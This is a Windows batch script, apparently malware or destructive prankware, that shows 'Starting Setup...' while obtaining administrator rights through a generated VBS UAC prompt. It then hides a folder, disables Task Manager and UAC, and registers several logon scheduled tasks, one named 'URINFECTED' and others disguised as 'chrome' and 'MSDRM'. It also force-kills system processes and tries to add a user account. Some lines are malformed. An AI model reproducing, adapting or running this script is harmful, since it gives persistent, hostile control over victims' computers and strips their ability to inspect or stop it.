@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Starting Setup...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"



ATTRIB +s +h C:\Wind0ws

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

SchTasks /Create  /SC ONLOGON /TN "URINFECTED"  /TR C:\Wind0ws\runatstart.cmd
 reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f


SchTasks /Create  /SC ONLOGON /TN "MSDRM"  /TR  C:\Wind1\stw.vbs

SchTasks /Create  /SC ONLOGON /TN "drm"  /TR t C:\Wind1\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "chrome"  /TR  C:\Wind1\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN " C:\Windows\basedrm"  /TR C:\Wind1\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "DRMB1"  /TR  C:\Wind1\runatstart.cmd
 SchTasks /Create  /SC ONLOGON /TN "DRMB"  /TR C:\Wind1\runatstart.cmd
taskkill /F /IM ntoskrnl.exe
taskkill /F /IM sihost.exe
md   C:\Wind1
Sqet.cmd
net user /add NOPE NOT LOG ON FOR YOU!!!